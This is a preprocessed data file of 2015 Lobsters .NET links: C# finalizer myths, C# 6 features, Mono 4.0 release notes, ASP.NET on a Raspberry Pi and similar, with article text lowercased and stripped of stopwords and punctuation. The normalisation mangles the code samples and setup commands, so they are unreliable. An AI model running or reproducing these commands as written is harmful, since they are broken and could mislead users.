549,Lobsters,dotnet,"C#, F#, .NET programming",5 Steps to an Ideal Windows 10 App Development Environment,http://developer.telerik.com/featured/5-steps-to-an-ideal-windows-10-app-development-environment/,step ideal window app development environment,start clean slate window iso rufus visual studio rc visual studio rc enable developer mode window build fast ring download window mobile emulator window mobile emulator hyperv deploy app physical device running window mobile window phone supported window insider app developer assistant visual studio developer assistant visual studio rc developer assistant api assistant programming task assistant compiler error assistant bonus tip check sample repo universal window apps repository design template leave tip,order setup killer window application development environment follow tip start clean slate window sdk work best window o variety way install o system several problem upgrading window box elected install window iso clean hard drive next issue ran exactly create bootable usb drive nt require diskpart quickly found program called rufus allow create bootable usb drive couple click matter fact thing change point iso file downloaded earlier able insert usb drive pc select boot first start fresh installation window insider preview install window sdk window window window server window server aware tool functionality exists platform though visual studio rc o installed obviously need visual studio rc chose enterprise edition community edition work well download enterprise edition make sure universal window app development tool optional feature install section checked proceeding enable developer mode window visual studio installed time create new window universal app going visual c window window universal selecting blank app template immediately run application greeted error message couple fix available suggested fix dialog box nt work instead simply crashed app able correct error adding registry key regedit created following key gave dword value hklmsoftwaremicrosoftwindowscurrentversionappmodelunlockallowalltrustedapps hklmsoftwaremicrosoftwindowscurrentversionappmodelunlockallowdevelopmentwithoutdevlicense way enable using gpedit powershell encourage check document located run project adding registry key deploy successfully local machine recently released build fast ring enable setting without changing registry key etc fast ring nt everybody know upgrading download window mobile emulator great deployed app local device would look phone immediately selected drop noticed said download new emulator wait default need download window mobile emulator show download installer ask want install would suggest leaving default preview close relaunch visual studio see emulator drop shown run app working emulator selected see following make sure check system requirement running emulator require hyperv turned bios need enabled one manually turn hardwareassisted virtualization modern pc hardwareassisted virtualization need turn far hyperv go turned default deploy app physical device running window mobile first thing needed check approved list window phone supported learned lumia supported downloaded window insider app app store signed preview went ahead decided change channel fast ring get latest build soon come need make sure selected device target output either arm neutral click run button get error open window phone developer registration tool log allow apps installed device able deploy window universal apps phone running window mobile please nt upgrade window phone try window mobile spare use search ebay amazon cheap device testing developer assistant visual studio begin downloading installing developer assistant visual studio rc developer assistant offer three way help api assistant allows find code sample apis coding visual studio example created textblock mainpagexaml began setting property code behind typing see automatically us bing pull codesnippets textalignment property programming task assistant provides code sample span web even includes sample project relevant sample github example quick search parse json winrt though visual studio compiler error assistant help resolve various compilation error example missing namespace take look error rightclick bring bing contexual search display bing search several site help resolve issue developer assistant visual studio also work version visual studio limited v rc bonus tip check sample repo universal window apps microsoft released repository contains sample demonstrate apis universal window platform window according microsoft code sample designed run desktop mobile future device support universal window platform also grab design template universal window platform uwp apps leave tip read tip window app development share comment
551,Lobsters,dotnet,"C#, F#, .NET programming",When everything you know about C# finalizers is wrong,http://ericlippert.com/2015/05/18/when-everything-you-know-is-wrong-part-one/,everything know c finalizers wrong,everything know wrong see cbrumme seminal post subject myth setting variable null cause finalizer run object previously referenced variable guarantee gc run myth calling cause finalizer run myth calling cause finalizers run myth finalizers guaranteed run every finalizable object myth finalizers guaranteed run eventually every finalizable object finalization suppressed myth finalizers guaranteed run eventually living reference object myth finalizers guaranteed run time garbage collector determined object unreachable myth finalizers object awaiting finalization guaranteed run provided finalizer thread scheduled run myth finalizers object awaiting finalization guaranteed run provided gc run gc identifies finalizable object finalizer thread scheduled run finalizer fast finalizer throw deadlock one pulled power cord wall good historical overview designed found finalizers guaranteed run next time faic even myth finalizers like,finalizers interesting dangerous environment everything know wrong written lot peril c finalizers destructors either name fine year scattered little bit internet series going try get everything one place bunch thing many people believe finalizers wrong first since blog suspense novel let briefly describe normal use term guardedly finalization semantics clr gc run gc thread identifies object living reference object finalizer candidate finalization go finalization queue instead reclaimed finalizer thread call finalizers object queue remove queue mark candidate finalization gc run object dead still dead time longer candidate finalization memory reclaimed brief sketch gloss many interesting corner case look series series considered complete list everything go wrong finalizers want deeper accurate historically interesting look finalizers designed early day net see cbrumme seminal post subject episode examine false belief people finalizer required run myth setting variable null cause finalizer run object previously referenced variable foo null force finalizer run setting variable null cause anything happen immediately except changing value variable variable last living reference object question fact discovered garbage collector run collector whatever generation object run might guarantee gc run myth calling dispose cause finalizer run foodispose force finalizer run dispose nothing special runtime convention call method named dispose object resource clean encoded runtime method standard pattern implementing dispose object finalizer dispose method finalizer call method dispose bool flag true caller dispose false finalizer dispose bool method work dispose method finalizer appropriate myth calling gccollect cause finalizers run cause collection happen might identify object candidate finalization force finalizer thread scheduled want testing purpose please call gcwaitforpendingfinalizers myth finalizers guaranteed run every finalizable object suppressfinalize method cause finalization suppressed hence name guarantee given object finalized finalization could suppressed fact common dispose suppress finalization object memory reclaimed earlier note sketch finalizable object need detected gc twice memory reclaimed like object dispose called get reclaimed one collection myth finalizers guaranteed run eventually every finalizable object finalization suppressed suppose object finalizer allocated reference object placed static field program go infinite loop object referenced static field alive therefore garbage collector never detects object dead therefore never put finalizer queue myth finalizers guaranteed run eventually living reference object garbage collector place object longer referenced onto finalizer queue requires garbage collector run last reference finalizable object could local variable method return object longer referenced program could go infinite loop allocates memory therefore produce collection pressure therefore garbage collector never run myth finalizers guaranteed run time garbage collector determined object unreachable case garbage collector put reference object onto finalization queue finalizer thread separate thread might never scheduled could always higherpriority thread myth finalizers object awaiting finalization guaranteed run provided finalizer thread scheduled run guarantee finalizer thread get object finalization queue number situation finalizer taking long finalizer throwing exception finalizer deadlocking appdomain unloaded process failing fast someone simply pulling power cord wall cause finalization never happen object finalizer queue myth finalizers object awaiting finalization guaranteed run provided gc run gc identifies finalizable object finalizer thread scheduled run finalizer fast finalizer throw deadlock one pulled power cord wall nope produce collection pressure gc running identifying finalizable object clearly finalizer thread running get output care predict behavior program class weird static int count weird count systemconsolewriteline count new weird static void main new weird program terminates without error created object machine mean one object never finalized going finalizers run process shut runtime set limit much time finalizer thread get spend making goodfaith effort run finalizers limit exceeded runtime simply stop running finalizers shuts program good historical overview designed found uptodate exegesis handy myth far imply code absolutely positively must run important realworld impact finalizer best choice finalizers guaranteed run next time faic even myth finalizers like like loading related
552,Lobsters,dotnet,"C#, F#, .NET programming",Server-side Responsive Design with ASP.NET MVC and Interchange,http://developer.telerik.com/featured/server-side-responsive-design-with-asp-net-mvc-and-interchange/,serverside responsive design aspnet mvc interchange,browser capability detection mobile view dropped res responsive design server side component introducing interchange foundation documentation interchange mvc interchange practice fine tuning conclusion,many attempt made net mvc ecosystem tackle responsive design server side technology like browser capability detection mobile view considerable option technique dropped favor client dependent technology like modernizr responsive design server side component res powerful concept aforementioned technology shown implementation nt always easy perfect article look interchange alternative solution zurb foundation framework us modern web approach implementing res res responsive design server side component clientside technique hiding content cs style class cause page bloat ui change made solely client side mean client receives markup image data regardless device screen size even hidden cs proactive approach taken including server process using server side code application deliver necessary content specific device need unlike visible hidden cs class res technique utilize server alter page sent user introducing interchange interchange component foundation framework us medium query dynamically load responsive html content image appropriate different user browser logic loading partial handled completely client side html javascript place browser charge requesting proper content server based client need interchange initialized creating div adding datainterchange attribute datainterchange attribute contains array url corresponding medium query div datainterchange defaulthtml screen mediumhtml screen minwidth largehtml screen minwidth div multiple named medium query available well make code legible list named medium query found foundation documentation div datainterchange defaulthtml small mediumhtml medium largehtml large div addition default html content placed inside interchange element content shown none medium query matched datainterchange attribute div datainterchange mediumhtml medium largehtml large p default content p div interchange mvc interchange fetch content via ajax get request url corresponding criterion met since interchange using simple get request action return html valid mean urlaction html helper used interchange fetch view server based screen size div datainterchange urlaction mediumview medium urlaction largeview large p default content p div unique action called per medium query alternatively single action used passing argument back action div datainterchange urlaction ressview new device medium medium urlaction ressview devicelarge large p default content p div interchange practice let take look interchange mvc based res used application example look responsive dashboard application application us basic foundation grid class create responsive clientside experience div class row div class column htmlaction employeeprofile new id modelemployeeid div div class column htmlpartial employeeqtdsales model div div class column htmlpartial employeemonthlyaveragesales model div div div class row div class column urlaction employeeschedule model div div desktop layout plenty screen space show overview employee detail full calendar schedule sale order screen size limited calendar view control even though responsive becomes le userfriendly using interchange switch ataglance agenda view provide better overall user experience mobile ui scheduler component already agenda view option need send argument back controller rendering change server side div class row div class column div datainterchange urlaction employeeschedule model issmalltrue small urlaction employeeschedule model medium div div controller public actionresult employeeschedule employeescheduleoptions option return partialview option model public class employeescheduleoptions employeeprofileoptions public bool issmall get set public bool agendaviewselected get return issmall public bool calendarviewselected get return issmall appending issmalltrue action call small value bind model default agenda view small screen larger screen detected interchange action without issmall otherwise false value called dynamically changing display calendar view fine tuning take concept step improve ux decreasing page load time let assume agenda view expensive resource load term data bandwidth add lazy loading application using interchange line javascript lazy loading protect user initial hit loading view upfront giving freedom load demand first use interchange default content block remove small action add button display medium query match made div datainterchange urlaction employeeschedule model medium class primary button expand href view schedule div next need reference action small device adding datalazyloadurl attribute button value action small device div datainterchange urlaction employeeschedule model medium class primary button expand href datalazyloadurl urlaction employeeschedule model issmalltrue view schedule div finally wire button using jquery load method call load method replace button result action defined lazyloadurl var el datalazyloadurl elon click function elclosest column load eldata lazyloadurl mobile view display view schedule button tapped reveal schedule via ajax arrangement present user option loading hidden data instead removing content completely user access addition page visited medium larger screen interchange seamlessly load full calendar view without user interaction conclusion microsoft changing stance browser capability detection mvc benefit open source solution like foundation interchange interchange powerful tool used conjunction aspnet mvc simplicity setup combined mvc urlaction helper make natural fit implementing res lazy loading ability target controller action based medium query open door creative solution using responsive design server side component
553,Lobsters,dotnet,"C#, F#, .NET programming",Does the Language You Use Make a Difference (revisited)?,http://simontylercousins.net/does-the-language-you-use-make-a-difference-revisited/,language use make difference revisited,,
554,Lobsters,dotnet,"C#, F#, .NET programming",Microsoft .NET Running on FreeBSD 10.1/amd64,https://github.com/dotnet/coreclr/issues/793,microsoft net running freebsd,join github today sign reload reload,dismiss join github today github home million developer working together host review code manage project build software together sign perform action time signed another tab window reload refresh session signed another tab window reload refresh session
555,Lobsters,dotnet,"C#, F#, .NET programming",Exploring C# 6 Null Propagation Operator (?.),http://www.volatileread.com/Wiki/Index?id=2104,exploring c null propagation operator,operator value type null propagation stringequals using delegate new feature c c challenge predict output,operator null propagation operator new operator c allows u reduce code required null check invocation chain following code var rolename usermanagercurrentuser null null usermanagercurrentusergetrole null null usermanagercurrentusergetrole name rewritten simply using operator var rolename usermanagercurrentuser getrole name rolename null currentuser getrole name null see code shorter intent immediately clear operator infact first statement call getrole function twice get called add code save result getrole another variable avoid using operator explore play around bit null propagation using snippet compiler value type null propagation know return type function stringequals bool think following code would compile try code compile give compiler error implicitly convert type bool bool might expected statement str equal x return null str null bool otherwise statement return value type return type statement get converted corresponding nullable type combining operator magic use operator case statement evaluated null provide default behavior eg var role usermanagercurrentuser getrole name role currentuser getrole name null return role try writing code without operator using delegate first may seem use null propagation delegate eg following invalid invalid code var result somedelegate p however achieve follows var result somedelegate invoke p see null propagation operator pure syntactic sugar unlikely replace every place useful immensely valuable provides clarity conciseness clearly conveys intent code related new feature c c challenge predict output
557,Lobsters,dotnet,"C#, F#, .NET programming",Open Source .NET libraries that make your life easier,http://thomasvm.github.io/blog/2015/03/17/open-source-net-libraries-that-make-your-life-easier/,open source net library make life easier,open source net library make life easier nuget top documentation framework hangfire hangfire blog people postal andrew davey postal mandrill postmark formo formo change drastically csvhelper csvhelper topshelf topshelf full reference conclusion,open source net library make life easier mar even though people sometimes claim open source net healthy state community often relies microsoft providing exist awesome open source library course last couple year started several often small scale new project work come rely library solve specific problem solve well post package nuget top list lesser known library deserve extra attention thing common yes excellent documentation time time turn extremely important os project especially go get starter board library framework sense nt force application structure require inherit class x nice library plug project promise let get hangfire hangfire library allows quickly beautifully add background processing aspnet application extremely simple setup scheduling background work straightforward backgroundjobenqueue consolewriteline simple several thing love hangfire builtin dashboard beautiful clear give good view happening maybe important going wrong requirement method executed background class inherit attribute added need public method allows structure background job see fit work add aspnet application restricted schedule process job basically anywhere window service console application azure web worker include application know able take code split different component needed hangfire still able processing featured scott hanselman blog probably helped lot highlight existence hangfire people also quickly noted shortcoming dependancy systemweb even though architected owin component depended commonlogging used sql server default true noted hangfire author sergey odinokov quick address issue hangfire already much better shape impression sergey know well postal shortly razor view engine came aspnet andrew davey excellent idea start using email templating postal born idea simple view folder get extra subdirectory called email put razor email template everything razor offer come free layout stronglytyped model urlhelpers partial etc sending email simple dynamic email new email example us viewsemailsexamplecshtml emailto webninja examplecom emailfunnylink dbgetrandomlolcatlink emailsend basically create email object treat dynamic chuck property onto inside email template viewbagto lolcats websitecom subject important message hello wanted important web link right check viewbagfunnylink course use stronglytyped model want respect webconfig smtp setting hence work perfectly service like mandrill postmark nice feature like image inlining built integrate perfectly mvc version good stuff formo whether console app web application window service reading appconfig webconfig application setting never fun thing especially want read datetime int value formo solves problem elegantly simply exposing setting dynamic object make code read setting much easier eye dynamic config new formoconfiguration simply read string string apiendpoint configapiendpoint convert value int need conversion code int timeout configapitimeout int us default value configuration file contains value int retries configapiretries int nt like dynamic even go step bind application setting simple poco class public class setting public string apiendpoint get set public int apitimeout get set dynamic configuration new formoconfiguration setting setting configurationbind setting even though formo scope limited even though seems reading configuration file change drastically find useful library reduced friction reading config file perfectly csvhelper dealing data legacy system csv file still commonly used way export data past used several different way dealing file copypaste codeproject yeah know hand written csv reader specific format etc bumped csvhelper feature love define csvclassmap populate certain poco class use csvreader convert row instance poco class way nt think nitty gritty detail occur need read csv file class map provide lot configuration option yet encounter situation csvhelper handle topshelf writing window service lot harder logic easy part writing configuring part creates service system mess follow visual studio way thing mess involves creating servicebase class contains business logic th service adding projectinstaller project go draganddrop territory designercs file toolbox magically generated initializecomponent method projectinstaller contain instance serviceprocessinstaller tell installer account service run projectinstaller also need contain one serviceinstaller instance tell get gist overly complex involves much automatically generated code magic string compare beauty topshelf service first create console app add topshelf nuget create class hold service logic important thing class must kind start stop method finally main method programcs look something like public static void main hostfactoryrun c cservice booksyncservice swhenstarted tc tcstart swhenstopped tc tcstop cusenlog csetservicename booksync csetdisplayname book sync service csetdescription sync book result simple exe file use install uninstall start stop window service install simply go commandline execute yourserviceexe install service configured window service registry operation similar find information full reference conclusion first sight none library something spectacular however make work lighter simply taking care mundane problem like background processing reading csv file creating window service value come allow focus real challenge application cheesy may beautiful goal
558,Lobsters,dotnet,"C#, F#, .NET programming","Mono 4.0.0 draft release notes, adopts Microsoft’s open source code",http://www.mono-project.com/docs/about-mono/releases/4.0.0/,mono draft release note adopts microsoft open source code,mono release note highlight floating point optimization c microsoft source code adoption http trellocombvrptmfdznetframeworkintegrationintomono decimal assorted microsoft class imported garbage collector dropped support old framework reference assembly npgsql http githubcomnpgsqlnpgsql entityframework feature fine tuning musl libc mac change switch bug fix runtimejit contributor,mono release note release date apr highlight adoption microsoft open source code c floating point optimization dropped support assembly updated ikvm lighter debugger overhead basic le support floating point optimization mono historically chosen use highest possible precision floating point operation mean math math done highest precision available performance sensitive code might need high precision negatively impacted release introducing support performing floating operation using math produce faster code expense fidelity mode operation enabled option sample mandelbrot generator program result original originalllvm option currently need enabled manually part oall option c mono c compiler default c compiler avoid generating guid time build generating identical build across recompilations following step roslyn new default microsoft source code adoption first release mono replaces various component mono code released microsoft mit license one three place microsoft referencesource drop microsoft corefx microsoft coreclr microsoft working towards net core redistributable reimagined version net project remains work progress mono point continues provide api track net desktopserver version mean code integrated come referencesource drop future deliver mono core along line net core allow use mono runtime new library distribution system developed corefx release ported component either incomplete buggy mono relatively easy port mono much done area interested tracking effort check project status http trellocombvrptmfdznetframeworkintegrationintomono mono ship subset referencesource adjusted work mono class library updated cross platform decimal replaced mono systemdecimal implementation microsoft version fixed couple formatting bug mono code major bug microsoft implementation efficient actively maintained fixing bug systemdecimal always difficult assorted microsoft class imported highlight code imported microsoft smaller bit like attribute enumeration event argument exception simple bit shown following namespaces entirely almost entirely replaced referencesource code systemcollections systemcollectionsconcurrent systemcollectionsgeneric systemcollectionsspecialized systemcomponentmodel systemcomponentmodeldesign systemdiagnosticcontracts systemlinq systemlinqparallel systemtextregularexpressions systemruntimecompilerservices systemthreadingtasks partial change system arraysegment bitconverter boolean byte char decimal sbyte convert datetime decimal guid lazy random timespan version systemcollectionsgeneric systemdiagnosticscontracts systemglobalization entire calendar stack daylighttime textinfo replaces text categorization table replaces net half size systemio bufferedstream stream memorystream streamreader streamwriter stringreader stringwriter textreader textwriter systemlinqexpressions dynamicexpression expressionvisitor systemnet cookie cookiecollection cookiecontainer ftpwebrequest webclient systemtext bring noncode page encoders systemthreading replaced also systemnumerics updated use referencesource used older microsoft open sourced version library past garbage collector xamarin performance team fine tuning mono sgen garbage collector dropped support old framework reference assembly longer build reference assembly net net net apis ship binary reference assembly api contract without actual executable code mono build net assembly well mobilebased profile note still run assembly compiled earlier net profile mono need recompile run net assembly instead npgsql mono longer distributes npgsql driver developer need better served using actively maintained npgsql driver site http githubcomnpgsqlnpgsql entityframework version entityframework shipped updated long time user currently getting entityframework nuget feature added lldb script assist developer debugging runtime lldb monoio method class us safehandles systemnetnetworkinformation implement feature platform fine tuning inline copy structure eight machine word previous five value larger still call memcpy complete operation support returning floating point structure value better pack floating point structure llvm given lattitude inline generated code method compiled llvm arm help many method passed large structure parameter atomic method framework recognized jit intrinsics inlined specialized code platform support includes method interlocked volatile well memorybarrier volatileread volatilewrite method thread threadmemorybarrier implemented mfence instead lock add rsp also interlockedexchange implemented xchg dst val instead overly expensive lock cmpxchg dst val loop previously emitted atomic method acquirerelease semantics emit memory barrier semantics instead overly strong sequentially consistent kind enumhasflag method significantly faster typical usage pattern ahasflag b b exact type transform call actual bitwise skip heavy reflection normally done method faster additionally regular implementation method used rarepathological case faster jit avoids emitting pointless move opcodes destination register source register runtime support performing call directly internal call known raise exception eliminates overhead wrapper method performance memory usage benefit precompiling assembly use directcalls option enable feature monop tool us ikvmreflection load assembly work foreign mscorlibs addition xi xa flag used search type xamarinandroid xamarinios framework musl libc rudimentary support building mono musl libc linux pas disableboehm withoutsigaltstack configure mac change systemnet support mac pac proxy configuration switch runtime requires compiler support window user mean visual studio required build mono cygwin mingw user affected change similarly compiler unix platform supported long time bug fix stepping static constructor exit mono assertion failed indexoutofrangeexception multipartformdatacontent filename value contains whitespace beginwrite failure systemnetsocketsnetworkstreambeginwrite invalidoperationexception servicepointremoveconnectiongroup productinfoheadervalue fails parse useragent string without version webmessageformatter crash void return type operationcontract datacontractserializer serialize enum flag net text field type nvarchar max truncated char xmlschemaread raise invalidelementerror certain input work fine msnet null reference exception occurs call inttostring multiple thread sgen marksweepconc fails load test decoder convert keep internal state call flush parameter false default ctor creates key expected httpclientgetstreamasync behaves differently net assembly attribute compiled correctly pe file unable debug lollipop sgen assert sgenobjgetdescriptor frequently allocating formatterservicesgetuninitializedobject runtime test testdaylightsavingstime failed casablanca western european standard time c invalid code generation nested type namespace sorting large structs wrong result bad xml produced xmlserializer writing xdocument debugger race condition synchronized static method generic class lock open type instead closed one cultureinfo constructor error message decimal hex lcid different yield statement used foreach return first record mc hang compile mc ignores missing bracket fatal unhandled exсeption systemformatexception clearcache miniarmc supported gcc toolchain crash occurs passing array object com method mono c parser encounter internal compiler error loading constant legal dll systemnethttphttpclient postasync ignores timeout webproxy accessible crash freeing com callable wrapper logicalcallcontext flowing async call listforeach throw invalidoperationexception collection modified multiplication passing optional parameter failing compile systemnethttp need escape rfc character dynamic property case sensitive mono crash stopping debug session dst transition bug structlayoutpack throw typeloadexception runtime embed assembly native code option causing sample build failure window systemuri constructor throw exception parsing http uri username password contains certain escaped character struct wnested structs return value pinvoke incorrectly marshalled requires write permission window compiled method name differ bit build safehandle always called disposed true bad code asyncawait task cause internal compiler error httpclientsendasync throw memory exception large file stack overflow printfn something mdb invalid scope invalid mdb scope variable systemiosynchronizedstream call close wrapped stream documentation method cocontravariant parameter raise error generating xml documentation nunitconsole leaf zombie process mono v proper behavior prior version mono throw outofmemoryexception ubuntu osx window microsoftfsharpcorelanguageprimitiveshashcomparegenericcompare cause assertion fieldinfogetvalue cause segmentation fault field pointer type memory leak buffer overflow getgsharedvttype assertion reached runtime crashing evaluating systemdiagnosticsprocesshasexited property lessthanorequal wrong result nuint type platform datacontractjsonserializer deserialize array ienumerable generic symbol name exported libmono safehandleclose idempotent custom marshaler broken wrong exception thrown calling systemglobalizationcharunicodeinfogetnumericvalue string int index invalid index barrier constructed participant hang addparticipant wrong dst timezoneinfo floating date rule set next statement cmdthreadsetip stepping work expected systemnethttpheadersrangeheadervalue fails parse large byte range result cast double int different mono net mono full aot crash void llvm callinst init llvm value arrayref llvm value const llvm twine assemblygettype fails parse type name containing comma constructorinfocontainsgenericparameters behaves differently msnet mdb generated window used nix fails sdb command rfe update valgrind header c async lambda nested lambda goto statement cause compiler crash project compiles visual studio xamarin studio internalerrorexception specifying optional attribute support reproducible build mc generates error cast fixed statement using alias scope nested class inheritence compiling class fixed member systemruntimedll contract fails structlayoutattribute accessible adding useragent header httpclient object throw systemformatexception invalid format writing asynchronous filestream add byte beginning file httprequestmessage adding accept header multiple value fails httpclient honor baseaddress get async method c interpolated string raise notimplementedexception cloneto compilation c interpolated string raise internal compiler error parsingsystem compilation csharp repl window accept input debugger crash error assertion condition tl met running mono process shell longer show input char flowanalysis issue parameter finally delegate containing return getting error could aot assembly building device xamarin studio osx fails compile visual studio succeeds internal compiler error interpolated string long unexpected symbol error two interpolated string used ternary operator marshalalloccotaskmem incorrectly return null runtimejit fixed case runtimeinternal memory barrier would actually emitted barrier kind field set nonsensical value note affect threadmemorybarrier fixed memory ordering interlockedcompareexchange sequentially consistent instead combined acquirerelease using llvm fixed atomic intrinsics getting stack type set leading issue methodtoir code generation pas fixed marshalling bug invoking differently typed delegate obtained marshalgetdelegateforfunctionpointer native function pointer dropped old mono jit convention saving register function entry optimized allocation small object speed improvement roslyn compiling mscorlib contributor bill seurer michael matz aetf alex j lennon alex rønne petersen alex soto alexander kyte alexander köplinger alexis christoforides alistair bush alistair lesliehughes atsushi eno ben wood bill seurer brendan zagaeski chris hubbard craig minihan crisdut damien daspit dave curylo david david karlaš eberhard beilharz etienne champetier fritz elfert guillaume turri henrik feldt jb evain jeffrey stedfast jim westfall jo shield joao matos matos jon purdy jonathan pryor jonathon rossi joão matos kai ruhnau kenneth pouncey leonid shalupov liam mcsherry lluis sanchez ludovic henry marcandre ferland marcos henrich marek habersack marek safar marius ungureanu mark probst mark martin baulig martin thwaites mauricio faria de oliveira michael matz miguel de icaza mike morano mirco bauer neale ferguson paolo molaro radek doulik reuben bond rijo robin neatherway rodrigo kumpera rolf bjarne kvinge ryan j melena ryan melena sebastien pouliot sergey odinokov stephen mcconnel stone gislason thomas petazzoni ungureanu marius vincent povirk vlad brezae vladimir kargov zoltan varga irodriguez zevane
559,Lobsters,dotnet,"C#, F#, .NET programming",Introduction to ASP.Net 5,https://dotnetkicks.com/articles/107527,introduction aspnet,net article,join handpicked round best net article every day curated moderator voted community free
562,Lobsters,dotnet,"C#, F#, .NET programming",What more could Microsoft be doing to support open source projects on its platforms?,https://dotnetkicks.com/articles/106654,could microsoft support open source project platform,dotnetkicks,nt able comment possible account whitelisted yet drop u tweet dotnetkicks get right
564,Lobsters,dotnet,"C#, F#, .NET programming",New C# 6.0 Features and Experimenting with them Online,http://volatileread.com/Wiki/Index?id=1075,new c feature experimenting online,online code snippet runner exception filter c exception filter much syntactic sugar using await catch finally block nameof operator null conditional operator new operator c c expression bodied method property c parameterless struct constructor quirk restriction,tryout new feature c online code snippet runner exception filter exception filter allow add additional condition exception handler write statement next catch block catch block get executed condition return true impractical silly example play around practical use would case need perform different action exception based property exception eg http error code try downloadwebpage catch httpexception ex exgethttpcode retry logic important advantage exception filter preserve clr stack c exception filter much syntactic sugar using await catch finally block await function catch finally block allowed prior c nameof operator time need name variable string form nameof operator take variable convert variable name string implemented inotifypropertychanged wpf would happy feature another practical situation need get name variable null conditional operator suppose instance class node class shown snippet want print invalid node instance null instance child property null normal way nodenull nodechildren null consolewriteline invalid node condition written c node child null consolewriteline invalid code operator return null anything object reference chain null would especially helpful long chain b c would retun null either b c null practical scenario useful firing event currently invoke delegate need create local copy avoid race condition check null invoke var localcopyonchanged onchanged localcopyonchanged null localcopyonchanged value null conditional operator code rewritten simply onchanged invoke value new operator c auto property initializers provide initialdefault value property even readonly time declaration string interpolation stringformat function instead passing parameter object want replace indexed marker inside string reference variable directly infact dont even need call stringformat function nothing new compiler magic using statement static class static class whose member using lot avoid typing class name everytime including class using declaration new feature c c expression bodied method property c parameterless struct constructor quirk restriction
565,Lobsters,dotnet,"C#, F#, .NET programming",How to run ASP.NET 5 Beta 3 or GoLang on a Raspberry Pi 2 - Scott Hanselman,http://www.hanselman.com/blog/HowToRunASPNET5Beta3OrGoLangOnARaspberryPi2.aspx,run aspnet beta golang raspberry pi scott hanselman,hanselminutes codenewbie teaming every weekday march http wwwmarchisformakerscom codenewbie hanselminutes marchisformakers http marchisformakerscom run aspnet beta running raspberry pi one running printer raspberry pi project love tiny computer basic raspberry pi set kit includes memory power wifi cable case etc tightvnc could remote raspberry pi desktop running aspnet raspberry pi notedisclaimer new version mono like version three point ten update important note option install mono mono project repository repository debian instruction mono site option build mono source slow advanced questionable value git clone mono repository build sudo reboot mono v adding aspnet github issue kpm restore note get fixed soon punit ganshani blog run go raspberry pi kind gentleman named dave cheney hosting unofficial arm tarballs go instruction golang site http marchisformakerscom marchisformakers related link hosting,hanselminutes codenewbie teaming produce two new podcast episode week month march featuring incredible maker hardware space new content every weekday march bookmark http wwwmarchisformakerscom join u codenewbie supportive community programmer people learning code tune every week story people coding journey hanselminutes fresh air developer weekly talk show brings interesting people together talk web culture education technology hashtag event marchisformakers dear reader help u street team share website http marchisformakerscom friend kid teacher family anyone think benefit learning hardware today maker culture day end march many great podcasts amazing guest live google hangout blog post twitter chat wednesday huge collection link project explore run aspnet beta running raspberry pi love raspberry pi tiny computer gone least count died gifted forward right got one running printer one running medium center raspberry pi kid using primary computer many raspberry pi project love tiny computer actually dual tutorialhowto impressed raspberry pi wanted see far one take still modest little machine definitely twice fast singletasking perhaps faster multitasking experience previous raspberry pi basic raspberry pi set use raspbian operating system image raspberry pi debian wheezy image techie unix nontechies use hardware amazon link put together although get kit includes memory power wifi cable case etc get disk image follow setup instruction also added tightvnc could remote raspberry pi desktop also allowed run headless without monitor see vnced raspberry pi course always connect monitor tv wanted see hard would run net raspberry pi depending deep want go hard running aspnet raspberry pi notedisclaimer point time betadaily build early thing sure get simple line future nt panic thinking aspnet linux suck early frist get old year old version open source mono runtime stable standard repository sudo aptget monocomplete get version basic stuff make helloworldcs run gmsc helloworldcsmono helloworldexe debian like stable told want get new version mono like version three point ten run thing like aspnet need little work update important note two option build mono source use custom repository mono folk option install mono mono project repository mono project repository debian distribution like raspbian wheezy put early mono want sudo aptget remove monocomplete first tidy per instruction mono site sudo aptkey adv keyserver keyserverubuntucom recvkeys echo deb http downloadmonoprojectcomrepodebian wheezy main sudo tee etcaptsourceslistdmonoxamarinlist sudo aptget update aptget upgrade sudo aptget install monocomplete set option build mono source slow advanced questionable value could git clone mono repository build found process slow downloaded source archive instead unzipped folder mkdir monosourcecd monosourcewget http xjvf bunch prerequisite needed plus htop like sudo aptget install buildessential autoconf automake binutils libtool libxrenderdev libgifdev libexifdev gettext htop start build hour dependent speed pi speed sd card class possible configure prefixusrlocal sudo skipaottrue make sudo skipaottrue make install note three line one sudo reboot done run mono v see version good place adding aspnet add aspnet point downloading sample directly github running kvminstallsh setup aspnet runtime manager mkdir cd clone git githubcomaspnethomegitsh kkvmkvmshkvm upgrade per github issue need tell system ssl cert nuget restore correctly certmgrusrlocalbincertmgrsudo certmgr ssl http gomicrosoftcomsudo certmgr ssl http nugetgalleryblobcorewindowsnetsudo certmgr ssl http nugetorgmozroots import machine sync go one sample like run kpm restore note us meg ram minute want newer raspberry pi note make sure sample version projectjson match local runtime version needed update version string match kvm list said sure get fixed soon kestrel web server us libuv http library build libuv found punit ganshani blog actually wishing found earlier blog post sudo aptget install gypwget http tar xvf f make duvlibrarysharedlibrarymake c outsudo cp outdebuglibtargetlibuvso ln run run k kestrel hit port mentioned projectjson run go raspberry pi wanted go running well go fewer dependency official arm build raspberry pi however kind gentleman named dave cheney building hosting unofficial arm tarballs go take instruction golang site link set raspberry pi pi raspberry pi wget http tar c usrlocal xzf add path profile whatever export path path usrlocalgobin make hellogogo compile run personally love see dotnet easy get running linux go package mainimport fmt func main fmtprintln hello go raspberry pi raspberry pi little joy lot fun lot potential definitely pick kid nt forget visit http marchisformakerscom tell friend tweet u marchisformakers related link hosting
566,Lobsters,dotnet,"C#, F#, .NET programming",ASP.NET 5 - A Deep Dive into the ASP.NET 5 Runtime,https://msdn.microsoft.com/en-us/magazine/dn913182.aspx,aspnet deep dive aspnet runtime,article aspnet deep dive aspnet runtime daniel roth k runtime environment kre crossplatform net console app figure figure injecting iservicemanifest service application hosting startup figure figure startup class figure figure implementing middleware reusable class nugetorg configuring service request processing owinorg katanaprojectcodeplexcom wrapping githubcomaspnethome daniel roth,minute read article march volume number aspnet deep dive aspnet runtime daniel roth march last november microsoft announced aspnet new open source crossplatform framework building modern web cloud application using microsoft net framework aspnet development team part released aspnet preview along visual studio preview connect event new york city introduced aspnet runtime new visual studio project system aspnet article special dec issue msdn magazine since last look aspnet december two preview release aspnet visual studio ctp visual studio ctp release framework continues evolve improve many case improvement generously contributed net community public aspnet project github article take deeper look hood new aspnet runtime see changed recent release k runtime environment kre saw back december aspnet based flexible crossplatform runtime host host one several net clrs run aspnet application net framework full api set maximum compatibility also run aspnet new net core enables true sidebyside deployment copy existing environment without change anything else machine future also able run aspnet crossplatform net core community support running crossplatform mono today runtime hosting infrastructure aspnet currently called k runtime environment kre generic placeholder name finalize official name kre provides environment everything net app need run host process clr hosting logic managed entry point discovery forth kre built running crossplatform net web application run type net application console apps kre based net clr base class library net developer come know love enabling crossplatform 